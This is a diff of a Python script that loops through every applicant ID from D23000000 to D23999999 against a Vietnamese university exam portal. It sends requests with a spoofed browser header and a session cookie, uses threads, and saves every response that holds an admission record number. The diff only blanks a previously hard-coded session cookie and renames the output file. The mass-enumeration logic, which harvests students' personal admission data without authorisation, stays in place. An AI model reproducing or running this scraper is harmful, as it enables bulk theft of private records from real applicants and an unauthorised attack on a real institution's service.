@@ -23,7 +23,7 @@ def abc(abc):
         "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
     headers["Referer"] = "https://thinangluc.vnuhcm.edu.vn/dgnl/app/home"
     headers[
-        "Cookie"] = "JSESSIONID=D63E56FC08BE10C995DF7C3B95F3C63F; _ga_S1PMX4L6E6=GS1.1.1686425220.1.1.1686425355.0.0.0; _ga=GA1.3.1528417990.1686425221; _gid=GA1.3.519138198.1686425221"
+        "Cookie"] = "" # Add your own cookie
 
     lock = threading.Lock()
     max_retries = 3
@@ -45,7 +45,7 @@ def abc(abc):
                     cpm = calculate_cpm()
                     if 'maHoSoXetTuyen' in response.text:
                         with lock:
-                            with open("/www/wwwroot/dgnl_fetch_api/test.txt", "a") as myfile:
+                            with open("output.txt", "a") as myfile:
                                 myfile.write(response.text + "\n")
                         print(f"CPM: {cpm}" + response.text)
                     else:
@@ -89,13 +89,6 @@ def abc(abc):
     while i <= 999999:
         data_payloads.append(f'"D23{str(i).zfill(6)}"')
         i += 1
-    ''' 
-    data_payloads = []
-    i = current
-    while i < 999999:
-        data_payloads.append(f'"D23{i}"')
-        i += 1
-    '''
     # Split the data payloads into chunks
     chunk_size = 100
     chunks = []
